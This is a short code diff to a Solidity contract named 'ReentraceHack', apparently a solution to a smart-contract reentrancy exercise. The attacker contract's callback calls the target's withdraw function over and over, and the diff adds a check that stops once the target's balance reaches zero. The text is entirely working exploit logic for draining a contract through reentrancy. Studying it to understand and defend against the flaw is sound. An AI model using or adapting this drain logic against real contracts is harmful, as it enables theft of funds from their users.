@@ -22,6 +22,10 @@ contract ReentraceHack {
     }
 
     function doCallback() private {
+        uint256 balanceOfContract = address(reentranceContract).balance;
+        if(balanceOfContract == 0){
+          return;
+        }
         uint256 amountToWithdraw = reentranceContract.balanceOf(address(this));
         emit Callback(msg.sender, uint56(amountToWithdraw));
         reentranceContract.withdraw(amountToWithdraw);
